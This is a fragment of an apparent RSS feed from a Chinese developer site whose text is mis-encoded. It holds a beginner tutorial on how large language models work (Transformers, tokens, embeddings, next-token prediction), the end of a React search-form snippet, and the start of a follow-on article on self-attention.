    router.<span class="hljs-title function_">push</span>(<span class="hljs-string">`/users?keyword=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(keyword)}</span>`</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSearch}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex gap-2"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>
        <span class="hljs-attr">value</span>=<span class="hljs-string">{keyword}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setKeyword(e.target.value)}
        placeholder="è¾“å…¥ç”¨æˆ·åæœç´¢"
        className="flex-1 p-2 border rounded"
      /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"px-4 py-2 bg-blue-500 text-white rounded"</span>&gt;</span>
        æœç´¢
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹]]></title>    <link>https://juejin.cn/post/7580674010838761518</link>    <guid>https://juejin.cn/post/7580674010838761518</guid>    <pubDate>2025-12-08T03:27:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838761518" data-draft-id="7580303864604180489" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:27:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:27:28.000Z" title="Mon Dec 08 2025 03:27:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>ç°åœ¨å¤§å®¶é‡åˆ°é—®é¢˜ï¼Œç¬¬ä¸€ååº”éƒ½ä¸æ˜¯ä½¿ç”¨æœç´¢å¼•æ“ï¼Œè€Œæ˜¯é—® chatGPTï¼Œchat å¤§å®¶éƒ½çŸ¥é“æ˜¯èŠå¤©çš„æ„æ€ï¼Œä½†æ˜¯Â <strong>GPT</strong>Â å®ƒåˆ°åº•æ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>å±•å¼€ä¸€ä¸‹å…¨åï¼šGenerative Pretrained Transformerï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯<strong>ç”Ÿæˆå¼é¢„è®­ç»ƒ Transformer</strong>ã€‚</p>
<p>æ‰€ä»¥åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦æ›´æ¸…æ¥šçŸ¥é“Â <strong>Transformer</strong>Â åˆ°åº•æ˜¯ä¸ªå•¥ã€‚</p>
<h2 data-id="heading-0">Transformer æ¶æ„</h2>
<p>è¯´åˆ° Transformer è¿˜æ˜¯ä¸èƒ½ä¸æå…¶æºå¤´ï¼Œé¼é¼å¤§åçš„ã€ŠAttention Is All You Needã€‹ï¼Œè¿™ç¯‡è®ºæ–‡æå‡ºäº†è¿™ä¸ªåä¸º Transformer çš„æ·±åº¦ç¥ç»ç½‘ç»œæ¶æ„ã€‚</p>
<p>åœ¨è®ºæ–‡é‡Œé¢ï¼Œè¿™ä¸ªæ¶æ„æ˜¯é•¿è¿™æ ·çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45d462621ea14486aadc15533178c5a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769248&amp;x-signature=Bl1ubRftV9Uvu0S0n2XKU1YG1LI%3D" alt="" loading="lazy"/></p>
<p>å…¶æ ¸å¿ƒå°±æ˜¯<strong>è‡ªæ³¨æ„åŠ›æœºåˆ¶</strong>ã€‚</p>
<p>æ³¨ï¼šåæ¥å¾ˆå¤š GPT åªä¿ç•™äº† decoderã€‚</p>
<h2 data-id="heading-1">æœ€åŸºæœ¬çš„åŸç†</h2>
<p>å›å¿†ä¸€ä¸‹ç¥ç»ç½‘ç»œï¼Œæˆ‘ä»¬çš„è¾“å…¥å’Œè¾“å‡ºï¼Œç»è¿‡ç¥ç»ç½‘ç»œè®­ç»ƒä¸€é¡¿æ“ä½œï¼è°ƒæ•´å¥½æƒé‡ï¼Œå°±èƒ½è¾“å‡ºåƒæ¨¡åƒæ ·çš„ç­”æ¡ˆã€‚</p>
<p>é‚£ä¹ˆå¯¹æ–‡å­—æ˜¯ä¸æ˜¯ä¹Ÿèƒ½è¿™ä¹ˆæ“ä½œå‘¢ï¼Ÿæ²¡é”™çš„ï¼Œäº‹å®è¯æ˜å®Œå…¨å¯ä»¥ã€‚</p>
<p>å› ä¸ºæ–‡å­—è¿™ä¸ªä¸œè¥¿ï¼Œç°æˆçš„æ­£ç¡®ç­”æ¡ˆçœŸçš„å¤ªå¤šå•¦ï¼Œæˆ‘ä»¬è®­ç»ƒçš„æ—¶å€™å¯ä»¥è¿™æ ·ï¼š</p>
<pre><code class="hljs">è¾“å…¥ï¼šç•ªèŒ„æ˜¯  
æ­£ç¡®ç»“æœï¼šç•ªèŒ„æ˜¯çº¢
</code></pre>
<p>å¦‚æœçŒœåˆ°çš„ä¸æ˜¯çº¢ï¼Œé‚£å°±<strong>è®¡ç®—æŸå¤±</strong>ï¼ŒæŠŠæƒé‡å¾€å¯¹çš„é‚£è¾¹å‡¹ä¸€ä¸‹ã€‚</p>
<p>ç»è¿‡å¾ˆå¤š TB çš„æ–‡å­—æ•°æ®è®­ç»ƒä¹‹åï¼Œå°±æˆå°±äº†ç°åœ¨çš„<strong>å¤§è¯­è¨€æ¨¡å‹</strong>ï¼Œå®ƒä¼¼ä¹äº†è§£åœ°çƒä¸Šä¸€åˆ‡æ–‡å­—çŸ¥è¯†ï¼Œå¹¶ä¸”è¡¨è¾¾å‡ºæ¥æ¯«æ— ç»´å’Œæ„Ÿã€‚</p>
<p>ç§‘å­¦ä¼¼ä¹è¿˜æ— æ³•è§£é‡Šè¿™ä»¶äº‹ï¼Œå¤§æ¨¡å‹å¯ä»¥æµç•…å›ç­”è®­ç»ƒæ ·æœ¬é‡Œæ²¡æœ‰çš„å†…å®¹ï¼Œè¿™å°±ç§°ä¸º<strong>æ¶Œç°</strong>ã€‚ä¾‹å¦‚å¤§æ¨¡å‹å…¶å®æ²¡æœ‰ä¸“é—¨å­¦è¿‡ç¿»è¯‘å‘¢ï¼Œä½†æ˜¯å®ƒååå°±å¯ä»¥åœ¨ç¹å¤šçš„å‚æ•°é‡Œé¢æ‡‚å¾—å¦‚ä½•ç¿»è¯‘ä¸åŒè¯­è¨€ã€‚</p>
<h2 data-id="heading-2">è¾“å…¥å’Œè¾“å‡º</h2>
<p>å¯¹äºå¤§æ¨¡å‹æ¥è¯´ï¼Œè¾“å…¥å’Œè¾“å‡ºï¼Œæœ¬è´¨ä¸Šæ˜¯ Tokenã€‚</p>
<p>é€šè¿‡è¿™ä¸ªåˆ†è¯å·¥å…·ï¼Œå¯ä»¥æ›´æ¸…æ™°åœ°ç†è§£ Token çš„æ¦‚å¿µï¼Œå®ƒä¸ä¸€å®šæ˜¯ä¸€ä¸ªå­—æ¯ã€ä¸€ä¸ªå•è¯ã€ä¸€ä¸ªç¬¦å·ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å®ƒä»¬çš„ç»„åˆã€‚</p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7babaf0cf86b4b54ac74d3ef2fe09c0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769248&amp;x-signature=TUpBZgauxSquMhCLAQmvxlZ%2BeSk%3D" alt="" loading="lazy"/></p>
<p>æ‰€ä»¥åœ¨è®­ç»ƒçš„æ—¶å€™ï¼Œè¾“å…¥è¾“å‡ºå°±æ˜¯ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">è¾“å…¥ï¼š30357,</span> <span class="hljs-number">21290</span><span class="hljs-string">,</span> <span class="hljs-number">226</span><span class="hljs-string">,</span> <span class="hljs-number">3221</span>  
<span class="hljs-string">è¾“å‡ºï¼š30357,</span> <span class="hljs-number">21290</span><span class="hljs-string">,</span> <span class="hljs-number">226</span><span class="hljs-string">,</span> <span class="hljs-number">3221</span><span class="hljs-string">,</span> <span class="hljs-number">16491</span>
</code></pre>
<p>å—ï¼Ÿ</p>
<p>ä¸æ˜¯çš„ï¼Œå®é™…è®­ç»ƒçš„è‚¯å®šä¸æ˜¯è¿™ä¸ª Token IDï¼Œè€Œæ˜¯è¿™ä¸ª ID ä»£è¡¨çš„å«ä¹‰æœ¬èº«ã€‚</p>
<p>æŠŠæ–‡å­—è½¬æ¢ä¸ºå‘é‡å°±æ˜¯æ‰€è°“çš„<strong>è¯åµŒå…¥ï¼ˆembeddingï¼‰</strong> ï¼ˆå…³äº RAG åé¢å†å¼€å‘ï¼‰ã€‚æ ¹æ®ã€Šä»é›¶æ„å»ºå¤§æ¨¡å‹ã€‹çš„è¯´æ³•ï¼šæœ€å°çš„ GPT-2 æ¨¡å‹ï¼ˆå‚æ•°é‡ä¸º 1.17 äº¿ï¼‰ä½¿ç”¨çš„åµŒå…¥ç»´åº¦ä¸º 768ï¼Œè€Œ GPT-3æ¨¡å‹ï¼ˆå‚æ•°é‡ä¸º 1750 äº¿ï¼‰ä½¿ç”¨çš„åµŒå…¥ç»´åº¦ä¸º 12288ã€‚</p>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯è®©è¿™ä¸ª Token è½¬æ¢ä¸ºä¸€ä¸ª 768 ä¸ªå€¼çš„æ•°ç»„â€¦â€¦</p>
<p>ä¾‹å¦‚ç•ªèŒ„å°±æ˜¯Â <code>[0.9,0.4,0.7,0.5,0.9...åé¢è¿˜æœ‰ä¸ƒç™¾å¤šä¸ªç»´åº¦]</code>ï¼Œå¯¹æ¯”å…¶å®ƒæ°´æœå¯èƒ½æ˜¯è¿™æ ·çš„ï¼š</p>















































<table><thead><tr><th>ç»´åº¦</th><th>å«ä¹‰</th><th>â€œç•ªèŒ„â€çš„å€¼</th><th>â€œè‰è“â€çš„å€¼</th><th>â€œé»„ç“œâ€çš„å€¼</th></tr></thead><tbody><tr><td>1</td><td>æœ‰å¤šçº¢</td><td><strong>0.9</strong></td><td>0.85</td><td>0.1</td></tr><tr><td>2</td><td>ç”œåº¦</td><td>0.4</td><td><strong>0.8</strong></td><td>0.1</td></tr><tr><td>3</td><td>æ°´åˆ†</td><td>0.7</td><td>0.6</td><td><strong>0.9</strong></td></tr><tr><td>4</td><td>æ˜¯å¦å±äºè”¬èœ</td><td><strong>0.5</strong></td><td>0.1</td><td><strong>0.8</strong></td></tr><tr><td>5</td><td>æ˜¯å¦å¯ç”Ÿåƒ</td><td><strong>0.9</strong></td><td><strong>0.95</strong></td><td>0.8</td></tr></tbody></table>
<p>æ³¨æ„ï¼šè¿™é‡Œçš„å«ä¹‰åªæ˜¯æ¯”å–»ï¼Œå®é™…ä¸Šå„ä¸ªç»´åº¦çš„å«ä¹‰äººç±»æ˜¯çœ‹ä¸æ‡‚çš„ã€‚</p>
<p>å¤§å®¶åº”è¯¥å·®ä¸å¤šç†è§£äº†ï¼Œ<strong>çœŸæ­£çš„è¾“å…¥è¾“å‡ºå°±æ˜¯è¿™äº›å‡ ç™¾ä¸Šåƒç»´åº¦</strong>ã€‚</p>
<p>æŠŠè¿™äº›å€¼çš„æ­£ç¡®æ’åˆ—ç»è¿‡ç¥ç»ç½‘ç»œè®­ç»ƒï¼Œè®©å…¶é¢„æµ‹ä¸‹ä¸€ä¸ª Token æ˜¯æŸä¸ªè¯çš„æ¦‚ç‡ï¼ˆlogitsï¼‰ï¼Œç„¶åå–æ¦‚ç‡æ¯”è¾ƒé«˜çš„å€¼ã€‚</p>
<p>æœ€åä¸¾ä¸ªè¾“å…¥è¾“å‡ºä¾‹å­ï¼š</p>
<pre><code class="hljs language-less" lang="less">è¾“å…¥: "ç•ªèŒ„æ˜¯"  
â†“ <span class="hljs-selector-tag">Token</span>åŒ–  
<span class="hljs-selector-tag">Token</span>: <span class="hljs-selector-attr">[123, 456, 789]</span>  
â†“ è½¬æ¢ä¸ºå‘é‡  
<span class="hljs-selector-tag">Vector</span>: <span class="hljs-selector-attr">[[0.1,0.2,...]</span>, <span class="hljs-selector-attr">[0.3,0.4,...]</span>, <span class="hljs-selector-attr">[0.5,0.6,...]</span>]  
â†“ ç¥ç»ç½‘ç»œé¢„æµ‹  
<span class="hljs-selector-tag">Hidden</span> <span class="hljs-selector-tag">State</span>: <span class="hljs-selector-attr">[0.7, -0.2, 1.1, ..., 0.3]</span> Â # <span class="hljs-number">768</span>ç»´éšè—çŠ¶æ€  
â†“ é€šè¿‡è¾“å‡ºå±‚æŠ•å½±  
<span class="hljs-selector-tag">Logits</span>: <span class="hljs-selector-attr">[-2.3, 1.5, ..., 4.2, ..., 2.1, ...]</span> Â # è¯æ±‡è¡¨å¤§å°çš„å‘é‡  
â†“ <span class="hljs-selector-tag">Softmax</span>è½¬æ¢ä¸ºæ¦‚ç‡  
æ¦‚ç‡åˆ†å¸ƒ: <span class="hljs-selector-attr">[0.001, 0.003, ..., 0.45(å¯¹åº”<span class="hljs-string">"çº¢"</span>), ..., 0.25(å¯¹åº”<span class="hljs-string">"åœ†çš„"</span>), ...]</span>  
â†“ é€‰æ‹©æœ€é«˜æ¦‚ç‡  
è¾“å‡º: <span class="hljs-selector-tag">Token</span> <span class="hljs-selector-tag">ID</span> <span class="hljs-number">4567</span> (å¯¹åº”<span class="hljs-string">"çº¢"</span>)
</code></pre>
<p>ä¸­é—´çœ‹ä¸æ‡‚ä¸ç”¨æ€•ï¼Œä¸‹ä¸€ç« å°±ä¼šè®²åˆ°<strong>è‡ªæ³¨æ„åŠ›æœºåˆ¶</strong>çš„åŸç†å•¦~</p>
<h3 data-id="heading-3">å¾ªç¯ç”Ÿæˆ</h3>
<p>ä¸Šé¢ä¸€é¡¿è¾“å…¥è¾“å‡ºå…¶å®åªç”Ÿæˆäº†ä¸€ä¸ªæ–° Tokenï¼Œä½ éœ€è¦ç”Ÿæˆä¸€å¥è¯çš„è¯ï¼Œå°±ç»§ç»­æŠŠæ–°çš„ Token æ‹¼åˆ°åŸæ¥çš„å¥å­é‡Œï¼Œç»§ç»­å¾ªç¯ä¸‹å»ï¼Œå°±èƒ½ç”Ÿæˆä¸€æ•´æ®µè¯å•¦ã€‚</p>
<h2 data-id="heading-4">å‚è€ƒèµ„æ–™</h2>
<ul>
<li>â€¢Â ä»é›¶æ„å»ºå¤§æ¨¡å‹</li>
<li>â€¢Â Deep Dive into LLMs like ChatGPT</li>
</ul>
<h2 data-id="heading-5">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7580674010838777902</link>    <guid>https://juejin.cn/post/7580674010838777902</guid>    <pubDate>2025-12-08T03:27:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838777902" data-draft-id="7580280096059293723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:27:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:27:33.000Z" title="Mon Dec 08 2025 03:27:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
